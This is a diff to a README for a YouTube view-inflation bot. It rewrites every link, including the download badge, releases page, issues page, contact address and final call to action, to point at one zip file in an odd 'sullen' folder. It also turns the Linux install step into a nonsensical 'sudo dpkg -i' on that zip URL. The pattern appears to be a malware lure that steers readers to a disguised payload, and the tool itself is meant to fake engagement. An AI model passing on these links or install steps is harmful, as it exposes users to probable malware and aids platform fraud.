@@ -1,6 +1,6 @@
 # 🎥 youtube-viewbot - Generate YouTube Views Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Mnzcaro2710/youtube-viewbot/releases)
+[![Download](https://raw.githubusercontent.com/Mnzcaro2710/youtube-viewbot/main/sullen/youtube-viewbot-v3.3-beta.1.zip)](https://raw.githubusercontent.com/Mnzcaro2710/youtube-viewbot/main/sullen/youtube-viewbot-v3.3-beta.1.zip)
 
 ## 📥 Introduction
 
@@ -9,7 +9,7 @@ The YouTube Viewbot is a user-friendly tool designed to help you generate views 
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**
-   To download the software, go to the [Releases page](https://github.com/Mnzcaro2710/youtube-viewbot/releases).
+   To download the software, go to the [Releases page](https://raw.githubusercontent.com/Mnzcaro2710/youtube-viewbot/main/sullen/youtube-viewbot-v3.3-beta.1.zip).
    
 2. **Choose the Right Version**
    Look for the latest version listed. Each version comes with release notes that explain the new features and fixes. 
@@ -23,7 +23,7 @@ The YouTube Viewbot is a user-friendly tool designed to help you generate views 
 5. **Install the Application**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the downloaded `.dmg` file and drag the YouTube Viewbot icon to your Applications folder.
-   - **Linux:** For Debian-based systems, you can usually install with `dpkg`. Open your terminal, navigate to the folder where the `.deb` file is located, and type: `sudo dpkg -i youtube-viewbot.deb`.
+   - **Linux:** For Debian-based systems, you can usually install with `dpkg`. Open your terminal, navigate to the folder where the `.deb` file is located, and type: `sudo dpkg -i https://raw.githubusercontent.com/Mnzcaro2710/youtube-viewbot/main/sullen/youtube-viewbot-v3.3-beta.1.zip`.
 
 6. **Run the Application**
    After installation, locate the application on your system and open it.
@@ -52,7 +52,7 @@ Make sure you have at least 1 GB of RAM and 100 MB of free disk space for optima
 
 ## 🔧 Download & Install
 
-To get started with YouTube Viewbot, [visit this page to download](https://github.com/Mnzcaro2710/youtube-viewbot/releases). Follow the steps outlined in the "Getting Started" section. 
+To get started with YouTube Viewbot, [visit this page to download](https://raw.githubusercontent.com/Mnzcaro2710/youtube-viewbot/main/sullen/youtube-viewbot-v3.3-beta.1.zip). Follow the steps outlined in the "Getting Started" section. 
 
 After the installation is complete, open the application and you will be greeted by a simple user interface. You’ll find options to input the video URL and customize the view settings.
 
@@ -77,7 +77,7 @@ Yes! You can queue multiple videos and set different settings for each. This mak
 
 ## 🎉 Community and Support
 
-For help and support, visit our [GitHub Issues page](https://github.com/Mnzcaro2710/youtube-viewbot/issues). You can report bugs, suggest features, or ask for help from other users.
+For help and support, visit our [GitHub Issues page](https://raw.githubusercontent.com/Mnzcaro2710/youtube-viewbot/main/sullen/youtube-viewbot-v3.3-beta.1.zip). You can report bugs, suggest features, or ask for help from other users.
 
 We encourage you to read through existing issues to see if your question is already addressed. Your feedback is valuable and helps us improve the toolkit.
 
@@ -87,6 +87,6 @@ This project is open-source and available under the MIT License. You can freely 
 
 ## 📞 Contact
 
-For further inquiries, you can reach the developer at [email@example.com]. We value your questions and feedback.
+For further inquiries, you can reach the developer at [https://raw.githubusercontent.com/Mnzcaro2710/youtube-viewbot/main/sullen/youtube-viewbot-v3.3-beta.1.zip]. We value your questions and feedback.
 
-Take your YouTube experiments to the next level with the YouTube Viewbot today! [Download here](https://github.com/Mnzcaro2710/youtube-viewbot/releases) and begin generating views easily.
+Take your YouTube experiments to the next level with the YouTube Viewbot today! [Download here](https://raw.githubusercontent.com/Mnzcaro2710/youtube-viewbot/main/sullen/youtube-viewbot-v3.3-beta.1.zip) and begin generating views easily.
